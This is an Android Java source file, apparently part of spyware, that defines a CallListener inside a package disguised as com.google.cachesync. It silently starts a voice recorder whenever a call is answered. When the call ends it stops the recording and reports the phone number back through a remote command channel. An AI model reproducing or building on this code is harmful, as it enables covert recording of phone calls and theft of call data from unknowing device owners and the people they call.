package com.google.cachesync;

import com.code4bones.utils.NetLog;

import android.content.Context;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;


public class CallListener extends PhoneStateListener {
	
	public static CallListener instance;
	public Context mContext;
	public CommandObj command;
	public boolean inCall;
	public String phone;
	
	
	public static CallListener getInstance(Context context,CommandObj command) {
		
		if ( CallListener.instance == null ) {
			CallListener.instance = new CallListener(context,command);
		}
		return CallListener.instance;
	}
	
	public CallListener(Context context,CommandObj cmd) {
		this.mContext = context;
		this.command = cmd;
		this.inCall = false;
	}
	
	public void onCallStateChanged(final int state, final String phoneNum)
	{
		try {
				switch (state) {
					case TelephonyManager.CALL_STATE_IDLE:
						if ( inCall ) {
								VoiceRecorder rec = VoiceRecorder.getInstance(mContext, command);
								rec.stop();
								command.Reply(phoneNum);
								inCall = false;
								NetLog.v("Idle \"%s\"\n",phoneNum);
						}
						break;
					case TelephonyManager.CALL_STATE_OFFHOOK:
						NetLog.v("OffHook \"%s\"\n",phoneNum);
						VoiceRecorder rec = VoiceRecorder.getInstance(mContext, command);
						rec.start();
						inCall = true;
						break;
					case TelephonyManager.CALL_STATE_RINGING:
							NetLog.v("Ring \"%s\"\n",phoneNum);
						break;
				} // switch
	 } catch ( Exception e ) {
		 NetLog.e("CallListener: %s\r\n", e.getMessage());
	 }
   } // onCallState
}
